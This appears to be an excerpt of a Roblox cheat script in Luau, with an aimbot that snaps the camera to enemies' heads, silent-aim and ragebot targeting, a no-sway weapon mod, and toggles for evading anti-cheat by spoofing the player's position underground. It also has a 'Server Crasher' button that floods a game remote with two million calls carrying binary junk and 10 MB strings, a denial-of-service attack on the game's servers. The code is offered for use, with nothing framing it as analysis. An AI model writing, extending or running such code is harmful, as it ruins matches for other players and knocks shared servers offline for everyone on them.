...
local flickbot_enabled = false
local flickbot_fov_options = {90, 180, 360}
local flickbot_fov_radius = 360
...
local function get_part_sample_points(part, samples_per_axis)
	if not part then return {} end
	samples_per_axis = samples_per_axis or 4
	local points = {}
	local cf, sz = part.CFrame, part.Size
	for xi = 0, samples_per_axis - 1 do
		for yi = 0, samples_per_axis - 1 do
			for zi = 0, samples_per_axis - 1 do
				local x = (xi / (samples_per_axis - 1)) * 2 - 1
				local y = (yi / (samples_per_axis - 1)) * 2 - 1
				local z = (zi / (samples_per_axis - 1)) * 2 - 1
				local edge_limit = 0.85
				if math.abs(x) < edge_limit and math.abs(y) < edge_limit and math.abs(z) < edge_limit then
					local offset = Vector3.new(x * sz.X/2, y * sz.Y/2, z * sz.Z/2)
					table.insert(points, (cf * CFrame.new(offset)).Position)
				end
			end
		end
	end
...
local function get_closest_screen_point(part, screen_center)
	local best_dist = math.huge
	local best_pos = nil
	for _, world_pos in ipairs(get_part_sample_points(part)) do
...
local function is_part_visible(part)
	for _, world_pos in ipairs(get_part_sample_points(part)) do
		local origin = Camera.CFrame.Position
		local dir = (world_pos - origin)
...
local function valid_flick_rage_player(player, require_visible)
	...
	local lp_hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not lp_hrp then return false end
	if (lp_hrp.Position - hrp.Position).Magnitude > MAX_RANGE then return false end
	if require_visible and not is_part_visible(head) then return false end
	return true
end
local function get_closest_target(fov, bodypart_name, visible_check)
	...
	local closest_part, closest_player, min_dist = nil, nil, math.huge
	...
	for _, player in ipairs(Players:GetPlayers()) do
		if valid_enemy_player(player) then
			...
			if part and is_in_range(part, MAX_RANGE) then
				if visible_check and not is_part_visible(part) then
				else
					local screen_pos, dist = get_closest_screen_point(part, screen_center)
					if screen_pos and dist < min_dist and dist < fov then
						min_dist = dist
						closest_part = part
	...
	return closest_player, closest_part, closest_screen_pos
end
local function get_closest_player(visible_check)
	local lp_char = LocalPlayer.Character
	local lp_root = lp_char and lp_char:FindFirstChild("HumanoidRootPart")
	if not lp_root then return nil end
	local closest, min_dist = nil, math.huge
	for _, player in ipairs(Players:GetPlayers()) do
		if valid_flick_rage_player(player) then
			local part = player.Character:FindFirstChild(silentaim_bodypart)
			if part then
				if visible_check and not is_part_visible(part) then
				else
					for _, world_pos in ipairs(get_part_sample_points(part)) do
						local dist = (lp_root.Position - world_pos).Magnitude
	...
	if shooter == LocalPlayer then
		if ragebot_enabled then
			...
			if target and target.Character then
				...
				local humanoid = target.Character:FindFirstChild("Humanoid")
				if target_part and humanoid and humanoid.Health > 0 and is_in_range(target_part, MAX_RANGE) and is_part_visible(target_part) then
...
local fake_position_enabled = false
local fake_position_thread = nil
local underground_enabled = false
local heartbeat_connection = nil
local dance_track = nil
local animation = Instance.new("Animation")
animation.AnimationId = "http://www.roblox.com/asset/?id=15693621070"
local animpos = 1.755
local underground = -7.6

local function toggle_fake_position(state)
    fake_position_enabled = state
    if fake_position_thread then
        fake_position_thread:Disconnect()
        fake_position_thread = nil
    end
    if fake_position_enabled then
        fake_position_thread = task.spawn(function()
            while fake_position_enabled do
...
local function enable_underground()
    if underground_enabled then return end
    underground_enabled = true
    local character = LocalPlayer.Character
    if character then
        local humanoid = character:FindFirstChildWhichIsA("Humanoid")
        if humanoid then
            dance_track = humanoid:LoadAnimation(animation)
            dance_track.Looped = false
            dance_track:Play(.1, 1, 0)
        end
    end
    heartbeat_connection = RunService.Heartbeat:Connect(function()
        if underground_enabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            if dance_track then
                dance_track.TimePosition = animpos
            end
            local root = LocalPlayer.Character.HumanoidRootPart
            local original_cframe = root.CFrame
            local spoofed_cframe = original_cframe + Vector3.new(0, underground, 0)
            root.CFrame = spoofed_cframe
...
local function disable_underground()
    if not underground_enabled then return end
...
local function get_flick_target()
	local screen_center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
	local closest_head, min_dist = nil, math.huge
	local closest_screen_pos = nil
	local closest_world_pos = nil
	for _, player in ipairs(Players:GetPlayers()) do
		if valid_flick_rage_player(player, true) then
			local head = player.Character:FindFirstChild("Head")
			for _, world_pos in ipairs(get_part_sample_points(head)) do
				local screen_pos, on_screen = Camera:WorldToViewportPoint(world_pos)
				if on_screen and screen_pos.Z > 0 then
					local dist = (Vector2.new(screen_pos.X, screen_pos.Y) - screen_center).Magnitude
					if dist < min_dist and dist < flickbot_fov_radius then
						min_dist = dist
						closest_head = head
						closest_screen_pos = screen_pos
	...
	return closest_head, closest_world_pos, closest_screen_pos
end

local function flick_to_target_camera()
	if not flickbot_enabled then return end
	local _, world_pos = get_flick_target()
	if not world_pos then return end
	local cam_pos = Camera.CFrame.Position
	Camera.CFrame = CFrame.new(cam_pos, world_pos)
end
RunService.RenderStepped:Connect(function()
	if flickbot_enabled then
		flick_to_target_camera()
	end
end)

local sway_connection = nil

local function apply_no_sway()
    if sway_connection then
        sway_connection:Disconnect()
        sway_connection = nil
    end
    if not no_sway_enabled then return end
    local function hook_humanoid()
        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            if sway_connection then sway_connection:Disconnect() end
            sway_connection = RunService.RenderStepped:Connect(function()
...
local function server_crasher()
    local crashRemote = Remotes:FindFirstChild("Spectate") and Remotes.Spectate:FindFirstChild("UpdateSpectate")
    if not crashRemote then
        Library:Notify("Crash remote not found!")
        return
    end

    local raw = "\n\0\0\242\165f\217\0B\0\0`yc4\232A"
    local payloadString = string.rep(raw, 520)
    local buf = buffer.fromstring(payloadString)
    local hugeStr = string.rep("A", 1024*1024*10)

    pcall(function()
        for i = 1, 2000000 do
            task.spawn(function()
                crashRemote:FireServer(buf, hugeStr)
            end)
        end
    end)
    Library:Notify("Crash packets sent!")
end
...
local FlickbotGroupbox = Tabs.Combat:AddRightGroupbox("Flickbot")
FlickbotGroupbox:AddToggle("FlickbotEnabled", {
	Text = "Flickbot",
	Default = flickbot_enabled,
	Callback = function(v) flickbot_enabled = v end,
})
FlickbotGroupbox:AddDropdown("FlickbotFOV", {
	Values = flickbot_fov_options,
	Default = 3,
	Text = "Flick FOV",
	Callback = function(v) flickbot_fov_radius = tonumber(v) end,
})
...
GunmodsGroupbox:AddToggle("NoSway", {
    Text = "No Sway",
    Default = no_sway_enabled,
...
AntiCheatGroupbox:AddToggle("FakePositionEnabled", {
    Text = "Fake Lag",
    Default = fake_position_enabled,
    Callback = function(v)
        toggle_fake_position(v)
    end,
})
AntiCheatGroupbox:AddToggle("UndergroundEnabled", {
    Text = "Underground",
    Default = underground_enabled,
    Callback = function(v)
        if v then
            enable_underground()
        else
...
AntiCheatGroupbox:AddSlider("AnimPos", {
    Text = "Underground Position",
    Default = animpos,
    Min = 0,
    Max = 5,
    Rounding = 3,
...
AntiCheatGroupbox:AddSlider("UndergroundValue", {
    Text = "Underground Offset",
    Default = underground,
    Min = -20,
    Max = 0,
    Rounding = 2,
...
MiscGroupbox:AddButton("Server Crasher", function()
    server_crasher()
end)
